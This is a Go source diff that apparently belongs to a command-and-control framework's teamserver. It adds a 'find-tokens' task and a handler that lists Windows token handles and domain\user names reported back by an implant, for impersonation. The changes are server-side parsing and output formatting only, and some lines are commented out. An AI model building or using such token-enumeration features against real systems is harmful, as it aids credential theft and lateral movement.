@@ -975,6 +975,15 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 				}
 
 				break
+
+			case "find-tokens":
+				SubCommand = 0xa
+
+				job.Data = []interface{}{
+					SubCommand,
+				}
+
+				break
 			}
 		}
 		break
@@ -3593,6 +3602,50 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 					}
 				} else {
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_REMOVE, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_COMMAND_TOKEN_FIND_TOKENS:
+
+				var (
+					Successful    int
+					Buffer        string
+					TokenValue    int
+					DomainAndUser string
+					//FmtString string
+					//Array     [][]any
+					//MaxString int
+				)
+
+				for Parser.Length() >= 4 {
+
+					Successful = Parser.ParseInt32()
+
+					if Successful  == win32.TRUE {
+
+						Buffer += "Delegation Tokens Available\n"
+						Buffer += "========================================\n"
+
+						Buffer += "Impersonation Tokens Available\n"
+						Buffer += "========================================\n"
+
+						for Parser.Length() >= 8 {
+							TokenValue    = Parser.ParseInt32()
+							DomainAndUser = string(Parser.ParseBytes())
+							Buffer += fmt.Sprintf("- Handle: %x, User: %s\n", TokenValue, DomainAndUser)
+						}
+
+						//FmtString = fmt.Sprintf(" %%-4v  %%-6v  %%-%vv  %%-4v  %%-4v\n", MaxString)
+
+
+						Output["Type"] = "Info"
+						Output["Message"] = "Tokens available:"
+						Output["Output"] = "\n" + Buffer
+					} else {
+						Output["Type"] = typeError
+						Output["Message"] = "Failed to list existing tokens"
+					}
 				}
 
 				break
